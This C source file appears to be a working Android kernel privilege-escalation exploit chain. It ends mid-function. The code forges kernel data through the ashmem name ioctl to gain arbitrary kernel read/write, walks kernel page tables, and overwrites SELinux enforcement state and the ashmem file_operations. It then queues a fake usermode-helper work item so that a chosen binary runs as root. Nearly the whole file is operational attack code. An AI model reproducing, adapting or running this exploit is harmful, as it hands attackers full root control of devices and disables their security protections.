#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#include "target.h"

#define FOPS_OFFSET 0x100
#define FOPS_TABLE_SIZE 0x120
#define ASHMEM_NAME_LEN 256
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
#define ASHMEM_SET_NAME _IOW(0x77, 1, char[ASHMEM_NAME_LEN])
#define WRITE_ALIGN 0x01000000ULL
#define WRITE_WINDOW 0x02000000U
#define ROOT_WORK_OFF 0x400
#define ROOT_DATA_OFF 0x600
#define USERCOPY_LOCK_OFF 0x900
#define USERCOPY_VALUE_OFF 0xa00
#define KS_SELINUX_LOCK_OFF 0xb00
#define KS_OWNER_LOCK_OFF 0xc00
#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"

struct umh_subprocess_info {
  unsigned char work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static volatile sig_atomic_t fops_repaired;
static pid_t page_holder_pid = -1;

int a536_reclaim_page(uint64_t slide);
uint64_t a536_find_slide(void);
_Noreturn void a536_write64(uint64_t slide, uint64_t target, uint64_t value,
                            uint64_t lock);

static _Noreturn void hold_page_common(unsigned char *target, uint64_t alias,
                                       uint64_t slide);
static _Noreturn void die(const char *where);

static void terminate_child(pid_t child, const char *where) {
  if (child > 0 && kill(child, SIGTERM) && errno != ESRCH)
    die(where);
}

static void reap_all_children(void) {
  for (;;) {
    int status;
    pid_t child = waitpid(-1, &status, 0);

    if (child > 0)
      continue;
    if (child < 0 && errno == EINTR)
      continue;
    if (child < 0 && errno == ECHILD)
      return;
    die("waitpid detach");
  }
}

static _Noreturn void die(const char *where) {
  int error = errno;

  fprintf(stderr, "FAIL %s errno=%d %s\n", where, error, strerror(error));
  exit(1);
}

static void put64(unsigned char *page, size_t offset, uint64_t value) {
  memcpy(page + offset, &value, sizeof(value));
}

static void put32(unsigned char *page, size_t offset, uint32_t value) {
  memcpy(page + offset, &value, sizeof(value));
}

static int set_name_blob_once(int fd, const unsigned char *blob, size_t length,
                              size_t zero) {
  char name[ASHMEM_NAME_LEN];

  memset(name, 'A', sizeof(name));
  for (size_t index = 0; index < length; index++)
    name[index] = blob[index] ? (char)blob[index] : 1;
  if (zero < length)
    name[zero] = 0;
  else
    name[length] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int set_name_blob(int fd, const unsigned char *blob, size_t length) {
  if (set_name_blob_once(fd, blob, length, length))
    return -1;
  for (size_t index = length; index > 0; index--) {
    if (!blob[index - 1] && set_name_blob_once(fd, blob, length, index - 1))
      return -1;
  }
  return 0;
}

static ssize_t kernel_write(int fd, uint64_t target, const void *data,
                            size_t length) {
  unsigned char blob[128];
  uint64_t base = target & ~(WRITE_ALIGN - 1);
  off_t position = (off_t)(target - base);

  if ((uint64_t)position + length > WRITE_WINDOW || !((base >> 24) & 0xff) ||
      !((base >> 32) & 0xff) || !((base >> 40) & 0xff) ||
      !((base >> 48) & 0xff) || !((base >> 56) & 0xff)) {
    errno = ERANGE;
    return -1;
  }
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, WRITE_WINDOW);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  if (set_name_blob(fd, blob, sizeof(blob)))
    return -1;
  return pwrite(fd, data, length, position);
}

static uint64_t g_slide;

static int kernel_address_mapped(int fd, uint64_t va);

static ssize_t kernel_read_raw(int fd, uint64_t target, void *data,
                               size_t length) {
  unsigned char blob[128];
  uint64_t page = 0;
  off_t position = 0;

  memset(blob, 0, sizeof(blob));
  memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
  for (uint64_t window = length; window < length + 0x10000; ++window) {
    uint64_t candidate_position = ASHMEM_PREFIX_COUNT - window;
    uint64_t candidate_page = target - candidate_position;
    int usable = 1;

    for (size_t i = 0; i < sizeof(candidate_page); ++i)
      if (!((candidate_page >> (i * 8)) & 0xff)) {
        usable = 0;
        break;
      }
    if (usable) {
      page = candidate_page;
      position = (off_t)candidate_position;
      break;
    }
  }
  if (!page) {
    errno = ERANGE;
    return -1;
  }
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  if (set_name_blob(fd, blob, sizeof(blob)))
    return -1;
  return pread(fd, data, length, position);
}

static ssize_t kernel_read(int fd, uint64_t target, void *data, size_t length) {
  int mapped = kernel_address_mapped(fd, target);

  if (mapped != 1) {
    errno = mapped == 0 ? EFAULT : ERANGE;
    return -1;
  }
  return kernel_read_raw(fd, target, data, length);
}

static int read64_raw(int fd, uint64_t target, uint64_t *value) {
  ssize_t result = kernel_read_raw(fd, target, value, sizeof(*value));

  return result == (ssize_t)sizeof(*value);
}

/*
 * 39-bit VA, 3-level, 4K page tables (CONFIG_ARM64_VA_BITS=39,
 * CONFIG_PGTABLE_LEVELS=3).  Returns 1 if va is mapped, 0 if not,
 * -1 if the tables cannot be walked safely (all table reads are
 * confined to the proven low linear window, so no strnlen fault).
 */
#define KS_PGDIR_SHIFT 30
#define KS_PMD_SHIFT 21
#define KS_PTE_SHIFT 12
#define KS_PTRS_PER_TABLE 512
#define KS_PTE_VALID 1ULL
#define KS_PTE_BLOCK 1ULL
#define KS_PTE_TYPE_MASK 3ULL
#define KS_ENTRY_PHYS_MASK 0x0000fffffffff000ULL
#define KS_LINEAR_LOW_END 0x100000000ULL
#define KS_LINEAR_HIGH_START 0x880000000ULL
#define KS_LINEAR_HIGH_END 0xa80000000ULL

static int ks_phys_to_low_va(uint64_t phys, uint64_t *va) {
  if ((phys < PHYS_OFFSET || phys >= KS_LINEAR_LOW_END) &&
      (phys < KS_LINEAR_HIGH_START || phys >= KS_LINEAR_HIGH_END))
    return 0;
  *va = PAGE_OFFSET | (phys - PHYS_OFFSET);
  return 1;
}

static int kernel_address_mapped(int fd, uint64_t va) {
  uint64_t pgd_va;
  uint64_t table_va;
  uint64_t entry;
  uint64_t table_phys;

  if (!read64_raw(fd, INIT_MM_IMAGE + g_slide + MM_PGD_OFF, &pgd_va))
    return -1;
  /*
   * init_mm.pgd points at the kernel's own page tables (swapper_pg_dir),
   * which live in the kernel image at 0xffffffc0...; user pgd tables are
   * vmalloc'd.  Both are live kernel pointers, so only reject clearly
   * bogus values.
   */
  if (pgd_va < PAGE_OFFSET)
    return -1;
  if (!read64_raw(
          fd, pgd_va + (((va >> KS_PGDIR_SHIFT) & (KS_PTRS_PER_TABLE - 1)) * 8),
          &entry))
    return -1;
  if (!(entry & KS_PTE_VALID))
    return 0;
  if ((entry & KS_PTE_TYPE_MASK) == KS_PTE_BLOCK)
    return 1;
  table_phys = entry & KS_ENTRY_PHYS_MASK;
  if (!ks_phys_to_low_va(table_phys, &table_va))
    return -1;
  if (!read64_raw(
          fd, table_va + (((va >> KS_PMD_SHIFT) & (KS_PTRS_PER_TABLE - 1)) * 8),
          &entry))
    return -1;
  if (!(entry & KS_PTE_VALID))
    return 0;
  if ((entry & KS_PTE_TYPE_MASK) == KS_PTE_BLOCK)
    return 1;
  table_phys = entry & KS_ENTRY_PHYS_MASK;
  if (!ks_phys_to_low_va(table_phys, &table_va))
    return -1;
  if (!read64_raw(
          fd, table_va + (((va >> KS_PTE_SHIFT) & (KS_PTRS_PER_TABLE - 1)) * 8),
          &entry))
    return -1;
  return (entry & KS_PTE_VALID) ? 1 : 0;
}

static int read_exact(int fd, uint64_t target, void *data, size_t length) {
  ssize_t result = kernel_read(fd, target, data, length);

  if (result == (ssize_t)length)
    return 1;
  if (result >= 0)
    errno = EIO;
  return 0;
}

static int write_exact(int fd, uint64_t target, const void *data,
                       size_t length) {
  ssize_t result = kernel_write(fd, target, data, length);

  if (result == (ssize_t)length)
    return 1;
  if (result >= 0)
    errno = EIO;
  return 0;
}

static int read64(int fd, uint64_t target, uint64_t *value) {
  return read_exact(fd, target, value, sizeof(*value));
}

static int read32(int fd, uint64_t target, uint32_t *value) {
  return read_exact(fd, target, value, sizeof(*value));
}

static int write64(int fd, uint64_t target, uint64_t value) {
  return write_exact(fd, target, &value, sizeof(value));
}

static int write32(int fd, uint64_t target, uint32_t value) {
  return write_exact(fd, target, &value, sizeof(value));
}

static int is_direct_pointer(uint64_t value) {
  return value >= PAGE_OFFSET && value < KERNEL_TEXT_MIN && !(value & 7);
}

static int root_socket_ready(void) {
  struct sockaddr_un address;
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  int ready;

  if (fd < 0)
    return 0;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s", ROOT_SOCKET_PATH);
  ready = connect(fd, (struct sockaddr *)&address, sizeof(address)) == 0;
  close(fd);
  return ready;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  int slave;
  int master_result;
  int slave_result;

  if (master < 0 || grantpt(master) || unlockpt(master) ||
      ptsname_r(master, slave_name, sizeof(slave_name))) {
    if (master >= 0)
      close(master);
    return 0;
  }
  slave = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave < 0) {
    close(master);
    return 0;
  }
  master_result = close(master);
  slave_result = close(slave);
  return master_result == 0 && slave_result == 0;
}

static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
  struct umh_subprocess_info fake;
  struct umh_kernel_data data;
  uint64_t work = alias + ROOT_WORK_OFF;
  uint64_t data_address = alias + ROOT_DATA_OFF;
  uint64_t completion =
      data_address + offsetof(struct umh_kernel_data, completion);
  uint64_t wait_list = completion + offsetof(struct umh_completion, next);
  uint64_t worklist;
  uint64_t wq = 0;
  uint64_t pwq = 0;
  uint64_t pool = 0;
  uint64_t pwq_wq = 0;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t color = 0;
  uint32_t refcnt = 0;
  uint32_t nr_inflight = 0;
  uint32_t nr_active = 0;
  uint32_t max_active = 0;
  uint32_t nr_idle = 0;
  uint32_t complete_done = 0;
  uint32_t raw_retval = 0;
  uint64_t entry = work + WORK_ENTRY_OFF;
  uint64_t work_data;
  int32_t retval;
  int wake_ok = 0;
  const char *root_helper = getenv("CVE43499_ROOT_HELPER");

  if (!root_helper || !*root_helper) {
    fprintf(stderr, "ROOT_FAIL CVE43499_ROOT_HELPER is missing\n");
    return 0;
  }
  if (access(root_helper, X_OK)) {
    fprintf(stderr, "ROOT_FAIL helper access errno=%d %s\n", errno,
            strerror(errno));
    return 0;
  }
  if (!read64(fd, SYSTEM_UNBOUND_WQ_ALIAS + slide, &wq) ||
      !is_direct_pointer(wq) || !read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq) ||
      !is_direct_pointer(pwq) || !read64(fd, pwq + PWQ_POOL_OFF, &pool) ||
      !is_direct_pointer(pool) || !read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq) ||
      pwq_wq != wq) {
    fprintf(stderr,
            "ROOT_FAIL queue ptr wq=%#llx pwq=%#llx pool=%#llx owner=%#llx\n",
            (unsigned long long)wq, (unsigned long long)pwq,
            (unsigned long long)pool, (unsigned long long)pwq_wq);
    return 0;
  }
  worklist = pool + POOL_WORKLIST_OFF;
  for (int attempt = 0; attempt < 500; attempt++) {
    if (!read64(fd, worklist, &list_next) ||
        !read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
        !read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle) ||
        !read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active))
      return 0;
    if (list_next == worklist && list_prev == worklist && nr_idle && !nr_active)
      break;
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || !nr_idle || nr_active) {
    fprintf(
        stderr,
        "ROOT_FAIL pool busy list=%#llx/%#llx head=%#llx idle=%u active=%u\n",
        (unsigned long long)list_next, (unsigned long long)list_prev,
        (unsigned long long)worklist, nr_idle, nr_active);
    return 0;
  }
  if (!read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) || color >= 15 ||
      !read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) || !refcnt ||
      !read32(fd, pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t),
              &nr_inflight) ||
      !read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active) || !max_active) {
    fprintf(
        stderr,
        "ROOT_FAIL queue state color=%u ref=%u flight=%u active=%u max=%u\n",
        color, refcnt, nr_inflight, nr_active, max_active);
    return 0;
  }

  memset(&data, 0, sizeof(data));
  if (snprintf(data.path, sizeof(data.path), "%s", root_helper) >=
      (int)sizeof(data.path)) {
    fprintf(stderr, "ROOT_FAIL helper path is too long\n");
    return 0;
  }
  snprintf(data.arg, sizeof(data.arg), "%s", "--umh");
  snprintf(data.uid, sizeof(data.uid), "%u", getuid());
  data.completion.next = wait_list;
  data.completion.prev = wait_list;
  data.argv[0] = data_address + offsetof(struct umh_kernel_data, path);
  data.argv[1] = data_address + offsetof(struct umh_kernel_data, arg);
  data.argv[2] = data_address + offsetof(struct umh_kernel_data, uid);
  data.envp[0] = 0;

  memset(&fake, 0, sizeof(fake));
  work_data = pwq | ((uint64_t)color << 4) | 5;
  memcpy(fake.work, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t), &worklist,
         sizeof(worklist));
  work_data = CALL_USERMODEHELPER_EXEC_WORK_IMAGE + slide;
  memcpy(fake.work + WORK_FUNC_OFF, &work_data, sizeof(work_data));
  fake.complete = completion;
  fake.path = data.argv[0];
  fake.argv = data_address + offsetof(struct umh_kernel_data, argv);
  fake.envp = data_address + offsetof(struct umh_kernel_data, envp);

  unlink(ROOT_SOCKET_PATH);
  if (!write_exact(fd, data_address, &data, sizeof(data)) ||
      !write_exact(fd, work, &fake, sizeof(fake))) {
    fprintf(stderr, "ROOT_FAIL payload write errno=%d %s\n", errno,
            strerror(errno));
    return 0;
  }
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
  if (!write32(fd, pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t),
               nr_inflight + 1) ||
      !write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) ||
      !write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1) ||
      !write64(fd, worklist + sizeof(uint64_t), entry) ||
      !write64(fd, worklist, entry)) {
    fprintf(stderr, "ROOT_FAIL queue write errno=%d %s\n", errno,
            strerror(errno));
    return 0;
  }
  printf("root queued wq=%#llx pwq=%#llx pool=%#llx work=%#llx color=%u "
         "counts=%u/%u/%u\n",
         (unsigned long long)wq, (unsigned long long)pwq,
         (unsigned long long)pool, (unsigned long long)work, color, nr_inflight,
         nr_active, refcnt);
  fflush(stdout);

  for (int attempt = 0; attempt < 8 && !complete_done; attempt++) {
    wake_ok |= wake_system_unbound();
    for (int poll = 0; poll < 250; poll++) {
      if (!read32(fd,
                  data_address + offsetof(struct umh_kernel_data, completion) +
                      offsetof(struct umh_completion, done),
                  &complete_done))
        return 0;
      if (complete_done)
        break;
      usleep(1000);
    }
  }
  if (!read32(fd, work + offsetof(struct umh_subprocess_info, retval),
              &raw_retval))
    return 0;
  retval = (int32_t)raw_retval;
  if (complete_done) {
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_socket_ready())
        break;
      usleep(10000);
    }
  }
  printf("root result wake=%d complete=%u retval=%d socket=%d\n", wake_ok,
         complete_done, retval, root_socket_ready());
  fflush(stdout);
  return complete_done && !retval && root_socket_ready();
}

static _Noreturn void hold_dirty_failure(const char *where) {
  fprintf(stderr, "ARW_FAIL %s errno=%d %s\n", where, errno, strerror(errno));
  fflush(stderr);
  for (;;)
    pause();
}

static _Noreturn void hold_root_failure(void) {
  fprintf(stderr, "ROOT_FAIL chain held live\n");
  fflush(stderr);
  for (;;)
    pause();
}

static uint64_t expected_fops_slot(size_t offset, uint64_t slide) {
  uint64_t image = 0;

  switch (offset) {
  case 0x08:
    image = ASHMEM_FOPS_08_IMAGE;
    break;
  case 0x10:
    image = ASHMEM_FOPS_10_IMAGE;
    break;
  case 0x18:
    image = ASHMEM_FOPS_18_IMAGE;
    break;
  case 0x50:
    image = ASHMEM_FOPS_50_IMAGE;
    break;
  case 0x58:
    image = ASHMEM_FOPS_58_IMAGE;
    break;
  case 0x60:
    image = ASHMEM_FOPS_60_IMAGE;
    break;
  case 0x70:
    image = ASHMEM_FOPS_70_IMAGE;
    break;
  case 0x80:
    image = ASHMEM_FOPS_80_IMAGE;
    break;
  case 0xc8:
    image = ASHMEM_FOPS_C8_IMAGE;
    break;
  case 0xe0:
    image = ASHMEM_FOPS_E0_IMAGE;
    break;
  default:
    break;
  }
  return image ? image + slide : 0;
}

static int kernel_fops_valid(int fd, uint64_t fops, uint64_t slide) {
  for (size_t offset = 0; offset < FOPS_TABLE_SIZE; offset += 8) {
    uint64_t actual;
    uint64_t expected = expected_fops_slot(offset, slide);

    if (!read64(fd, fops + offset, &actual) || actual != expected)
      return 0;
  }
  return 1;
}

static int prove_and_restore_fops(uint64_t alias, uint64_t slide) {
  static const uint64_t read_marker = 0x4135333652454144ULL;
  static const uint64_t write_marker = 0x4135333657524954ULL;
  uint64_t fops_target = ASHMEM_MISC_FOPS_ALIAS + slide;
  uint64_t original_fops = ASHMEM_FOPS_IMAGE + slide;
  uint64_t scratch = alias + 0x800;
  uint64_t before = 0;
  uint64_t readback = 0;
  uint64_t kernel_after = 0;
  uint64_t selinux_live = SELINUX_LIVE_QWORD;
  uint64_t selinux_readback = 0;
  uint64_t restored = 0;
  uint64_t pwq_cache = 0;
  uint64_t usercopy_target;
  uint64_t usercopy_value = alias + USERCOPY_VALUE_OFF;
  uint64_t usercopy_lock = alias + USERCOPY_LOCK_OFF;
  ssize_t read_before;
  ssize_t read_scratch;
  ssize_t write_scratch;
  ssize_t read_after;
  ssize_t clear_fake_owner;
  ssize_t restore_selinux;
  ssize_t read_selinux;
  ssize_t restore_fops;
  ssize_t read_restored;
  int fd;
  int slots_ok;

  fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
  if (fd < 0)
    hold_dirty_failure("open forged ashmem");
  slots_ok = kernel_fops_valid(fd, alias + FOPS_OFFSET, slide);
  read_before = kernel_read(fd, fops_target, &before, sizeof(before));
  read_scratch = kernel_read(fd, scratch, &readback, sizeof(readback));
  write_scratch =
      kernel_write(fd, scratch, &write_marker, sizeof(write_marker));
  read_after = kernel_read(fd, scratch, &kernel_after, sizeof(kernel_after));
  clear_fake_owner =
      write64(fd, alias + FOPS_OFFSET, 0) ? (ssize_t)sizeof(uint64_t) : -1;
  restore_selinux = kernel_write(fd, SELINUX_STATE_ALIAS + slide, &selinux_live,
                                 sizeof(selinux_live));
  read_selinux = kernel_read(fd, SELINUX_STATE_ALIAS + slide, &selinux_readback,
                             sizeof(selinux_readback));
  restore_fops =
      kernel_write(fd, fops_target, &original_fops, sizeof(original_fops));
  read_restored = kernel_read(fd, fops_target, &restored, sizeof(restored));
  printf("arw slots=%d fops=%zd/%#llx scratch=%zd/%#llx/%zd/%zd/%#llx "
         "owner=%zd selinux=%zd/%zd/%#llx restore=%zd/%zd/%#llx\n",
         slots_ok, read_before, (unsigned long long)before, read_scratch,
         (unsigned long long)readback, write_scratch, read_after,
         (unsigned long long)kernel_after, clear_fake_owner, restore_selinux,
         read_selinux, (unsigned long long)selinux_readback, restore_fops,
         read_restored, (unsigned long long)restored);
  fflush(stdout);
  if (!slots_ok || read_before != (ssize_t)sizeof(before) ||
      before != alias + FOPS_OFFSET ||
      read_scratch != (ssize_t)sizeof(readback) || readback != read_marker ||
      write_scratch != (ssize_t)sizeof(write_marker) ||
      read_after != (ssize_t)sizeof(kernel_after) ||
      kernel_after != write_marker ||
      clear_fake_owner != (ssize_t)sizeof(uint64_t) ||
      restore_selinux != (ssize_t)sizeof(selinux_live) ||
      read_selinux != (ssize_t)sizeof(selinux_readback) ||
      selinux_readback != selinux_live ||
      restore_fops != (ssize_t)sizeof(original_fops) ||
      read_restored != (ssize_t)sizeof(restored) || restored != original_fops) {
    errno = EBADE;
    hold_dirty_failure("forged fops proof");
  }
  printf("ARW_OK\n");
  fflush(stdout);
  if (!read64(fd, PWQ_CACHE_ALIAS + slide, &pwq_cache) ||
      !is_direct_pointer(pwq_cache) ||
      ((pwq_cache + KMEM_CACHE_USERSIZE_OFF) & 7) ||
      (uint32_t)usercopy_value < 0x100) {
    errno = EBADE;
    hold_dirty_failure("pwq cache pointer");
  }
  usercopy_target = pwq_cache + KMEM_CACHE_USERSIZE_OFF;
  fops_repaired = 0;
  printf("PATCH_REQUEST target=%#llx value=%#llx lock=%#llx "
         "cache=%#llx usersize=%#x\n",
         (unsigned long long)usercopy_target,
         (unsigned long long)usercopy_value, (unsigned long long)usercopy_lock,
         (unsigned long long)pwq_cache, (uint32_t)usercopy_value);
  fflush(stdout);
  while (!fops_repaired)
    pause();
  if (!write64(fd, alias + USERCOPY_VALUE_OFF, 0))
    hold_dirty_failure("usercopy owner");
  printf("PATCH_OK usersize=%#x\n", (uint32_t)usercopy_value);
  fflush(stdout);
  if (!install_umh_root(fd, alias, slide))
    hold_root_failure();
  printf("ROOT_OK\n");
  fflush(stdout);
  return fd;
}

static void repair_fops_owner(int signal_number) {
  (void)signal_number;
  fops_repaired = 1;
}

static _Noreturn void hold_page_common(unsigned char *target, uint64_t alias,
                                       uint64_t slide) {
  struct sigaction action;

  memset(&action, 0, sizeof(action));
  action.sa_handler = repair_fops_owner;
  sigemptyset(&action.sa_mask);
  if (sigaction(SIGUSR1, &action, NULL))
    die("sigaction fops repair");
  printf("fops pid=%d pfn=0 lock=%#llx fops=%#llx target=%#llx "
         "original=%#llx user=%p\n",
         getpid(), (unsigned long long)alias,
         (unsigned long long)(alias + FOPS_OFFSET),
         (unsigned long long)(ASHMEM_MISC_FOPS_ALIAS + slide),
         (unsigned long long)(ASHMEM_FOPS_IMAGE + slide), target);
  fflush(stdout);
  while (!fops_repaired)
    pause();
  {
    int arw_fd = prove_and_restore_fops(alias, slide);

    if (close(arw_fd))
      die("close forged arw");
  }
  if (page_holder_pid > 0) {
    int status;
    pid_t waited;

    if (kill(page_holder_pid, SIGTERM) && errno != ESRCH)
      die("stop page holder");
    do {
      waited = waitpid(page_holder_pid, &status, 0);
    } while (waited < 0 && errno == EINTR);
    if (waited < 0 && errno != ECHILD)
      die("wait page holder");
    page_holder_pid = -1;
  }
  printf("ARW_FD_CLOSED\n");
  fflush(stdout);
  _exit(0);
}

static pid_t spawn_reclaim(uint64_t slide, int *read_fd) {
  int pair[2];
  pid_t child;

  if (pipe2(pair, O_CLOEXEC))
    die("pipe reclaim");
  child = fork();
  if (child < 0)
    die("fork reclaim");
  if (!child) {
    if (dup2(pair[1], STDOUT_FILENO) < 0 || dup2(pair[1], STDERR_FILENO) < 0)
      _exit(126);
    close(pair[0]);
    close(pair[1]);
    _exit(a536_reclaim_page(slide));
  }
  close(pair[1]);
  *read_fd = pair[0];
  return child;
}

static _Noreturn void hold_reclaimed_page(uint64_t slide) {
  const size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  unsigned char *pages;
  unsigned char *target;
  unsigned long long base = 0;
  pid_t probe_pid = -1;
  int read_fd;
  FILE *stream;
  char line[512];

  g_slide = slide;
  for (int attempt = 0; attempt < 4 && !base; ++attempt) {
    if (attempt)
      usleep(500 * 1000);
    probe_pid = spawn_reclaim(slide, &read_fd);
    stream = fdopen(read_fd, "r");
    if (!stream)
      die("fdopen reclaim");
    while (fgets(line, sizeof(line), stream)) {
      printf("ks: %s", line);
      fflush(stdout);
      if (sscanf(line,
                 "PAGE_LEAK_TARGET_READY initial_mm=%*llx selected_base=%llx",
                 &base) == 1)
        break;
      if (!strncmp(line, "PAGE_LEAK_COLLISIONS_FAIL", 25) ||
          !strncmp(line, "PAGE_LEAK_GROUP_FAIL", 20))
        break;
    }
    fclose(stream);
    if (!base)
      waitpid(probe_pid, NULL, 0);
  }
  if (!base || (base & (page_size - 1))) {
    errno = EPROTO;
    die("bad reclaimed page");
  }
  pages = mmap(NULL, page_size * 3, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (pages == MAP_FAILED)
    die("mmap proof pages");
  pages[0] = 0;
  pages[page_size * 2] = 0;
  target = pages + page_size;
  printf("ks page base=%#llx user=%p\n", base, target);
  fflush(stdout);
  page_holder_pid = probe_pid;
  hold_page_common(target, base, slide);
}

static uint64_t find_slide(void) {
  uint64_t slide = a536_find_slide();

  if (slide > MAX_PHYSICAL_SLIDE || (slide & (PHYSICAL_SLIDE_ALIGNMENT - 1))) {
    errno = EPROTO;
    die("prefetch slide");
  }
  printf("SLIDE_PREFETCH value=%#llx\n", (unsigned long long)slide);
  fflush(stdout);
  return slide;
}

static pid_t run_q0_write_stage(uint64_t slide, uint64_t target, uint64_t value,
                                uint64_t lock, const char *label) {
  int pair[2];
  int ready = 0;
  pid_t child;
  FILE *stream;
  char line[512];

  if (pipe2(pair, O_CLOEXEC))
    die("pipe q0");
  child = fork();
  if (child < 0)
    die("fork q0");
  if (!child) {
    if (dup2(pair[1], STDERR_FILENO) < 0)
      _exit(126);
    close(pair[0]);
    close(pair[1]);
    a536_write64(slide, target, value, lock);
  }
  close(pair[1]);
  stream = fdopen(pair[0], "r");
  if (!stream)
    die("fdopen q0");
  while (fgets(line, sizeof(line), stream)) {
    printf("%s: %s", label, line);
    fflush(stdout);
    if (!strncmp(line, "consume done;", 13)) {
      ready = 1;
      break;
    }
    if (!strncmp(line, "FAIL", 4)) {
      errno = EPROTO;
      die("q0 write");
    }
  }
  fclose(stream);
  if (!ready) {
    errno = EPROTO;
    die("q0 ended");
  }
  return child;
}

static _Noreturn void run_chain(uint64_t slide) {
  char line[512];
  unsigned long long lock;
  unsigned long long fops;
  unsigned long long target;
  unsigned long long patch_target;
  unsigned long long patch_value;
  unsigned long long patch_lock;
  FILE *fops_log;
  pid_t fops_pid;
  pid_t selinux_pid;
  pid_t write_pid;
  pid_t owner_pid;
  pid_t patch_pid = -1;
  int pair[2];
  int ready = 0;
  int arw_ready = 0;
  int patch_ready = 0;
  int root_ready = 0;

  if (pipe2(pair, O_CLOEXEC))
    die("pipe fops");
  fops_pid = fork();
  if (fops_pid < 0)
    die("fork fops");
  if (!fops_pid) {
    if (dup2(pair[1], STDOUT_FILENO) < 0 || dup2(pair[1], STDERR_FILENO) < 0)
      _exit(126);
    close(pair[0]);
    close(pair[1]);
    hold_reclaimed_page(slide);
  }
  close(pair[1]);
  fops_log = fdopen(pair[0], "r");
  if (!fops_log)
    die("fdopen fops");
  for (;;) {
    if (!fgets(line, sizeof(line), fops_log)) {
      errno = EPROTO;
      die("fops page log");
    }
    printf("%s", line);
    fflush(stdout);
    if (sscanf(line, "fops pid=%*d pfn=%*llx lock=%llx fops=%llx target=%llx",
               &lock, &fops, &target) == 3)
      break;
    if (!strncmp(line, "ARW_FAIL", 8) || !strncmp(line, "CHAIN_FAIL", 10)) {
      errno = EPROTO;
      die("fops stage");
    }
  }

  selinux_pid = run_q0_write_stage(slide, SELINUX_STATE_ALIAS + slide, 0,
                                   lock + KS_SELINUX_LOCK_OFF, "selinux");
  write_pid = run_q0_write_stage(slide, target, fops, lock, "fops-write");
  owner_pid = run_q0_write_stage(slide, fops, 0, lock + KS_OWNER_LOCK_OFF,
                                 "fops-owner");
  if (kill(fops_pid, SIGUSR1))
    die("start fops proof");

  while (fgets(line, sizeof(line), fops_log)) {
    printf("%s", line);
    fflush(stdout);
    if (!strncmp(line, "ARW_OK", 6))
      arw_ready = 1;
    if (!strncmp(line, "PATCH_REQUEST", 13)) {
      if (patch_pid > 0 ||
          sscanf(line, "PATCH_REQUEST target=%llx value=%llx lock=%llx",
                 &patch_target, &patch_value, &patch_lock) != 3 ||
          patch_target < PAGE_OFFSET ||
          patch_value != lock + USERCOPY_VALUE_OFF ||
          patch_lock != lock + USERCOPY_LOCK_OFF) {
        errno = EPROTO;
        die("patch request");
      }
      patch_pid = run_q0_write_stage(slide, patch_target, patch_value,
                                     patch_lock, "usercopy");
      if (kill(fops_pid, SIGUSR1))
        die("finish usercopy patch");
    }
    if (!strncmp(line, "PATCH_OK", 8))
      patch_ready = 1;
    if (!strncmp(line, "ROOT_OK", 7) && arw_ready && patch_ready)
      root_ready = 1;
    if (root_ready && !strncmp(line, "ARW_FD_CLOSED", 13)) {
      ready = 1;
      break;
    }
